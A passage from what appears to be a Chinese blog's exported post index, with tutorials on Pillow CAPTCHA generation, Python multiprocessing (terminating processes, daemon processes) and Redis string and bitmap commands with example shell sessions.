punctuation">(</span>ImageFilter<span class="token punctuation">.</span>FIND_EDGES<span class="token punctuation">)</span>  imgF<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  outF<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  conF<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  edgeF<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-利用Pillow生成验证码"><a href="#4-利用Pillow生成验证码" class="headerlink" title="4.利用Pillow生成验证码"></a>4.利用<code>Pillow</code>生成验证码</h3><blockquote><p>主要使用到 <code>ImageDraw</code> 生成文字和绘制干扰线</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span>  Image<span class="token punctuation">,</span>ImageDraw<span class="token punctuation">,</span> ImageFont<span class="token punctuation">,</span> ImageFilter<span class="token keyword">import</span> random<span class="token comment" spellcheck="true"># 生成随机字母,根据ASCII 表得到的数据 65-90 为A-Z的大写字母</span><span class="token keyword">def</span>  <span class="token function">rndChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span>  chr<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成随机颜色</span><span class="token keyword">def</span>  <span class="token function">rndColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span>  <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成随机颜色2</span><span class="token keyword">def</span> <span class="token function">rndColor2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 图片大小</span>width <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span><span class="token number">4</span>height <span class="token operator">=</span> <span class="token number">60</span><span class="token comment" spellcheck="true"># 创建图片</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建Font对象</span>font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'C:\Windows\Fonts\Gabriola.ttf'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建draw对象,生成图</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 填充像素</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> y <span class="token keyword">in</span> range<span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>  draw<span class="token punctuation">.</span>point<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>rndColor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出文字</span>verify <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>temp <span class="token operator">=</span> rndChar<span class="token punctuation">(</span><span class="token punctuation">)</span>verify<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span>t <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> temp<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>rndColor2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>verify<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 模糊</span>img <span class="token operator">=</span> img<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>BLUR<span class="token punctuation">)</span>img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'code.png'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>Image</code>: 负责处理图片</li><li><code>ImageDraw</code>: 负责处理画笔</li><li><code>ImageFont</code>: 负责处理文字</li><li><code>ImageFilter</code>负责处理路径</li></ul><hr><p><code>Image.new()</code>:主要用来生成画布.<code>Image.new(mode,size,color=0)</code></p><ul><li><p>mode可以是彩色图片用到的RGB模式，也可以是计算机处理常用的灰度图片的L模式。如果是RGB模式，所有的颜色都是三元素元组，如果是L模式，所有的颜色都是单值</p></li><li><p>size是一个二元元组，分别是pixel为单位的宽和高。需要注意计算机中的坐标都是以左上角为原点，左边为x，下面为y</p></li><li><p>color是画布的背景色，根据前面的mode进行设置</p><p><code>ImageDraw.Draw(im, mode=None)</code> 用于生成画笔</p></li><li><p>im是一个Image对象，画笔必须要和画布绑定才能操作</p></li><li><p>mode填一个和画布一样的模式即可</p></li></ul><hr><pre class="line-numbers language-python"><code class="language-python">mageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">'font=None'</span><span class="token punctuation">,</span> <span class="token string">'size=10'</span><span class="token punctuation">,</span> <span class="token string">'index=0'</span><span class="token punctuation">,</span> <span class="token string">"encoding=''"</span><span class="token punctuation">,</span> <span class="token string">'layout_engine=None'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通常指定字体和大小即可，而且实际赋值的时候不用写为list</p><ul><li>font是一个文件或类文件对象，格式为TrueType Font(.ttf)</li><li>size是字体的大小</li></ul><hr><p><code>draw.text(xy,text,fill=None,font=None)</code>添加文字</p><ul><li>xy是一个二元元组，是文字的左上角坐标</li><li>text是文字内容，字符串对象</li><li>fill是文字颜色，根据画笔的mode设定，如果是RGB就是三元元组</li><li>font就是<code>ImageFont</code>对象</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python Pillow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Pillow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杀死进程</title>
      <link href="/posts/31179.html"/>
      <url>/posts/31179.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h2><blockquote><p>使用<code>terminate()</code>方法立即杀死一个进程,通过<code>is_alive()</code>方法判断一个进程是否存活</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 如果子进程需要知道父进程的名字,需要显示声明</span> name <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># multiprocessing.current_process().name</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Exiting {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""主进程"""</span> p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>foo<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'foo_process'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'启动子进程之前,子进程存活:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>is_alive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'启动子进程,子进程存活:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>is_alive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 杀死子进程</span> p<span class="token punctuation">.</span>terminate<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'杀死子进程,子进程存活:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>is_alive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 阻塞主进程</span> p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'阻塞主进程,子进程存活:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>is_alive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程退出码:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>exitcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">启动子进程之前,子进程存活:False启动子进程,子进程存活:True杀死子进程,子进程存活:True阻塞主进程,子进程存活:False子进程退出码:-15<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建了一个子进程,然后使用<code>is_alive()</code>监控它的生命周期,然后调用<code>terminate()</code> 方法杀死进程,最后通过读进程的<code>exitcode</code> 属性来验证进程早已结束.</p><p><code>exitcode</code> 的可能值为</p><ul><li><code>== 0</code>: 没有错误,正常退出</li><li><code>&gt;0</code>:进程没有错误,并以次状态码退出</li><li><code>&lt;0</code>:进程被<code>-N</code> 的信号杀死并以此为状态码退出</li></ul><p>在上面<code>exitcode</code> 是<code>-15</code> ,表示子进程被数字为15的信号杀死,<code>signal</code> 为15,<a href="./10051.md">查表</a> 或者通过linux命令行<code>kill -l</code> 可以知道是<code>15) SIGTERM</code> 也就是终止信号.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后台子进程</title>
      <link href="/posts/40003.html"/>
      <url>/posts/40003.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="后台子进程"><a href="#后台子进程" class="headerlink" title="后台子进程"></a>后台子进程</h2><h3 id="1-简述"><a href="#1-简述" class="headerlink" title="1.简述"></a>1.简述</h3><blockquote><p>如果需要处理比较巨大的任务,又不需要人为干涉,将其作为后台进程执行是个非常常用的编程模型.此进程又可以和其他进程并发执行.</p><p>主进程执行完毕后,子进程也会结束.</p><p>需要注意的是:后台进程不能创建子进程,否则,当后台进程随着父进程退出的时候,子进程会变成孤儿进程.</p></blockquote><h3 id="2-设置后台子进程"><a href="#2-设置后台子进程" class="headerlink" title="2.设置后台子进程"></a>2.设置后台子进程</h3><blockquote><p>未来后台运行进程,需要把<code>daemon</code>(守护程序) 设置为<code>True</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 如果子进程需要知道父进程的名字,需要显示声明</span> name <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># multiprocessing.current_process().name</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Exiting {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""主进程"""</span> <span class="token comment" spellcheck="true"># 后台子进程</span> background_process <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>foo<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'后台子进程'</span><span class="token punctuation">)</span> background_process<span class="token punctuation">.</span>daemon <span class="token operator">=</span><span class="token boolean">True</span> background_process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> no_background_process <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>foo<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"子进程"</span><span class="token punctuation">)</span> no_background_process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">Start <span class="token operator">&lt;</span>Process<span class="token punctuation">(</span>子进程, started<span class="token punctuation">)</span><span class="token operator">></span>Exiting <span class="token operator">&lt;</span>Process<span class="token punctuation">(</span>子进程, started<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>非后台子进程会看到一个输出结果,而后台进程不会输出,后台进程在主进程结束之后会自动结束.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat">’</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis类型string</title>
      <link href="/posts/4819.html"/>
      <url>/posts/4819.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="String数据类型"><a href="#String数据类型" class="headerlink" title="String数据类型"></a><code>String</code>数据类型</h2><blockquote><p>字符串数据类型的相关命令.</p></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>append key value</code></td><td>如果<code>key</code> 存在并且是一个字符串,<code>append</code><br>将追加<code>value</code> 到末尾.</td></tr><tr><td><code>bitcount key [start] [stop]</code></td><td>计算给定字符串中被设置为<code>1</code> 的比特位的数量</td></tr><tr><td><code>bitop operation destkey key</code></td><td>对一个或多个二进制的字符串进行位元操作<br>将结果保存在<code>destkey</code> 上.</td></tr><tr><td><code>decr key</code></td><td>将<code>key</code> 中存储的数字值减<code>1</code></td></tr><tr><td><code>decrby key decrement</code></td><td>将<code>key</code> 中存储的数字值减去给定的<code>decrement</code> 值</td></tr><tr><td><code>get key</code></td><td>获取<code>key</code> 的值</td></tr><tr><td><code>getbit key offset</code></td><td>对<code>key</code>的字符串值,获取指定偏移量(单位<code>bit</code>)</td></tr><tr><td><code>getrange key start end</code></td><td>获取<code>key</code>的字符串值的子值</td></tr><tr><td><code>getset key value</code></td><td>给定<code>key</code>的值设置为<code>value</code>,返回<code>key</code> 的旧值.</td></tr><tr><td><code>incr key</code></td><td>将<code>key</code> 存储的数字值加<code>1</code></td></tr><tr><td><code>incrby key increment</code></td><td>将<code>key</code> 中存储的数字值加上给定的<code>decrement</code> 值</td></tr><tr><td><code>incrbyfloat key increment</code></td><td>将<code>key</code> 中存储的数字值加上给定的<code>decrement</code> 值<br>给定的浮动数</td></tr><tr><td><code>mget key1 [key2 ...]</code></td><td>获取一个或多个给定的<code>key</code> 的值</td></tr><tr><td><code>mset key value [key value]</code></td><td>同时设置一个或多个键值对</td></tr><tr><td><code>msetnx key value [key value]</code></td><td>当<code>key</code> 不存在时,设置一个或多个键值对</td></tr><tr><td><code>psetex key milliseconds value</code></td><td>设置键值对,并设置单位为毫秒的生存时间</td></tr><tr><td><code>set key value</code></td><td>设置一个键值对</td></tr><tr><td><code>setbit key offset value</code></td><td>对<code>key</code> 的字符串值,设置或清除偏移量(单位:<code>bit</code>)</td></tr><tr><td><code>setex key seconds value</code></td><td>设置键值对,生存时间单位是秒</td></tr><tr><td><code>setnx key miliseconds vlaue</code></td><td>设置键值对,生存时间单位是毫秒</td></tr><tr><td><code>setrange key offset value</code></td><td>用<code>value</code>参数覆盖给定<code>key</code> 存储的字符串值,从<br>偏移量<code>offset</code> 开始</td></tr><tr><td><code>strlen key</code></td><td>返回<code>key</code> 存储的字符串长度.</td></tr></tbody></table></blockquote><h3 id="2-基本设置"><a href="#2-基本设置" class="headerlink" title="2.基本设置"></a>2.基本设置</h3><blockquote><ol><li><code>set</code>:生成一个键值对</li></ol><pre class="line-numbers language-bash"><code class="language-bash">SET key value <span class="token punctuation">[</span>EX seconds<span class="token punctuation">]</span> <span class="token punctuation">[</span>PX milliseconds<span class="token punctuation">]</span> <span class="token punctuation">[</span>NX<span class="token operator">|</span>XX<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 将字符串值 value 关联到 key</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>如果<code>key</code> 已经有其他值,<code>set</code> 会覆盖新值,无视类型.<code>ttl</code> 被清除,并重新开始.</li><li><code>EX second</code> :设置过期时间,单位秒. <code>SET key value EX second</code> 效果等同于 <code>SETEX key second value</code>.</li><li><code>PX millsecond</code>:设置过期时间,单位毫秒.<code>SET key value PX millisecond</code> 效果等同于 <code>PSETEX key millisecond value</code> .</li><li><code>NX</code> :只有键不存在时,才对键进行设置操作.<code>SET key value NX = SETNX key value</code></li><li><code>XX</code>:只有键存在时,才对键进行操作.</li></ul><ol start="2"><li><code>get</code> :获取键的值</li></ol><pre class="line-numbers language-shell">get key</code></pre><pre><code class="bash"><code class="language-shell">get key</code></pre><pre><code class="bash"># 对不存在的键设值127.0.0.1:6379> get key"value"127.0.0.1:6379> set key new-valueOK# 对存在的键设值127.0.0.1:6379> get key"new-value"# 设置超时时间127.0.0.1:6379> set key-with-expire-time hello ex 10OK127.0.0.1:6379> get key-with-expire-time"hello"# 10秒之后获取127.0.0.1:6379> get key-with-expire-time(nil)# 如果服务器返回OK,那么客户端获取锁# 如果服务器返回 NIL,客户端获取锁失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-bitmap-位图设置"><a href="#3-bitmap-位图设置" class="headerlink" title="3.bitmap 位图设置"></a>3.<code>bitmap</code> 位图设置</h3><blockquote><p>位图是指对数据的最小单位<code>bit</code> 位进行操作.比如,字符串<code>big</code></p><pre class="line-numbers language-bash"><code class="language-bash">b --<span class="token operator">></span> ASCII码 98 --<span class="token operator">></span> 二进制是 01100010i --<span class="token operator">></span> ASCII码105 --<span class="token operator">></span> 二进制为 01101001g --<span class="token operator">></span> ASCII码103 --<span class="token operator">></span> 二进制为 01100111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在<code>redis</code> 中,可以获取到<code>big</code> 的<code>ASCII</code> 码的每一位对应的值,也就是<code>0</code> 或<code>1</code> .</p><pre class="line-numbers language-shell"><code class="language-shell">127.0.0.1:6379> set key-big bigOK127.0.0.1:6379> get key-big"big"127.0.0.1:6379> getbit key-big 0(integer) 0127.0.0.1:6379> getbit key-big 1(integer) 1127.0.0.1:6379> getbit key-big 2(integer) 1127.0.0.1:6379> getbit key-big 3(integer) 0# 对比字母 b 的二进制 01100010 可以看到获取二进制的一致# 从0 位开始获取.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常用的命令是:</p><ol><li><code>setbit key offset value</code> :对<code>key</code> 所存储的字符串值,设置或清除指定偏移量上的位<code>bit</code>.<code>offset</code> 从<code>0</code> 开始,小于2的32次方.(字符串最大可存储<code>512M</code>)</li><li><code>getbit key offset</code> :对<code>key</code> 所存储的字符串,获取指定偏移量上的位<code>bit</code></li></ol><pre class="line-numbers language-shell"><code class="language-shell">127.0.0.1:6379> get key-big"big"127.0.0.1:6379> setbit key-big 7 1    # 因为是从0开始,指定的是第8位上变成1,也就是 01100011=> c(integer) 0127.0.0.1:6379> get key-big"cig"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li><code>bitcount key [start] [stop]</code> :计算给定的字符串中,被设置为<code>1</code> 的比特位的数量.</li></ol><pre class="line-numbers language-shell"><code class="language-shell">127.0.0.1:6379> bitcount key-big(integer) 13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li><code>bittop operation destkey key [key...]</code> : 做多个bitmap的<code>and(交集)or(并集)not(非)or(异或)</code>操作并将结果保存在<code>destkey</code>中 .</li></ol><hr><p><code>bitmap</code> 位图应用:假如一个网站有1亿用户,<code>user_id</code> 用的是整型,长度为32位,每天有5千万独立用户访问,如何判断哪些用户访问了网站.</p><ol><li>用<code>set</code> 来保存数据,运行一天占用的内存为:</li></ol><pre class="line-numbers language-shell">32bit * 50000000 = (4bytes * 50000000) / 1024 /1024  大约占用200MB</code></pre><ol start="2"><li>使用<code>bitmap</code> 保存数据.在<code>user_id</code> 的索引上设置为<code>1</code> ,没有访问的<code>user_id</code> 索引位置为<code>0</code>,运行一天占用的内存为:</li></ol><pre><code class="shell">1bit * 100000000 = 100000000 / 1024 /1024/ 8  约为12.5MB</code></pre><p>使用<code>bitmap</code> 可以节省大量的内存资源.</p></blockquote><h3 id="4-setrange-getrange"><a href="#4-setrange-getrange" class="headerlink" title="4.setrange\getrange"></a>4.<code>setrange\getrange</code></h3><blockquote><ol><li><code>setrange key offset value</code> :用<code>value</code>参数覆盖给定<code>key</code> 存储的字符串值,从偏移量<code>offset</code> 开始.不存在的<code>key</code> 被当做空白字符串处理.如果给定的字符串比偏移量小,中间的空白会用零字节(<code>\x00</code>) 填充.(<code>offset</code>从0开始)</li><li><code>getrange key start end</code> :返回<code>key</code> 中字符串的子字符串,可以给定负数,<code>-1</code> 表示最后一个.</li></ol><pre><code class="shell"><code class="language-shell">32bit * 50000000 = (4bytes * 50000000) / 1024 /1024  大约占用200MB</code></pre><ol start="2"><li>使用<code>bitmap</code> 保存数据.在<code>user_id</code> 的索引上设置为<code>1</code> ,没有访问的<code>user_id</code> 索引位置为<code>0</code>,运行一天占用的内存为:</li></ol><pre><code class="shell">1bit * 100000000 = 100000000 / 1024 /1024/ 8  约为12.5MB</code></pre><p>使用<code>bitmap</code> 可以节省大量的内存资源.</p></blockquote><h3 id="4-setrange-getrange"><a href="#4-setrange-getrange" class="headerlink" title="4.setrange\getrange"></a>4.<code>setrange\getrange</code></h3><blockquote><ol><li><code>setrange key offset value</code> :用<code>value</code>参数覆盖给定<code>key</code> 存储的字符串值,从偏移量<code>offset</code> 开始.不存在的<code>key</code> 被当做空白字符串处理.如果给定的字符串比偏移量小,中间的空白会用零字节(<code>\x00</code>) 填充.(<code>offset</code>从0开始)</li><li><code>getrange key start end</code> :返回<code>key</code> 中字符串的子字符串,可以给定负数,<code>-1</code> 表示最后一个.</li></ol><pre><code class="shell">127.0.0.1:6379> set greeting 'hello world'OK127.0.0.1:6379> get greeting"hello world"127.0.0.1:6379> SETRANGE greeting 6 'redis'(integer) 11127.0.0.1:6379> get greeting"hello redis"127.0.0.1:6379> get greeting"hello redis"127.0.0.1:6379> getrange greeting 1 5"ello "127.0.0.1:6379> getrange greeting 0 5"hello "127.0.0.1:6379> getrange greeting -3 -1"dis<span aria-hidden="true" 